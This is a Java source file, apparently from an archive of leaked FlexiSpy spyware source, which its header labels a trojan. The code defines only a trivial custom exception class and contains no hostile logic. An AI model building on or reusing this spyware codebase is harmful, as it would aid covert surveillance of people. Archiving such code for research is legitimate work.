/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.exceptions;

public class FxOperationNotAllowedException extends Throwable {
	
	private static final long serialVersionUID = 1L;
	
	public FxOperationNotAllowedException() { super(); }
	public FxOperationNotAllowedException(String s) { super(s); }
}
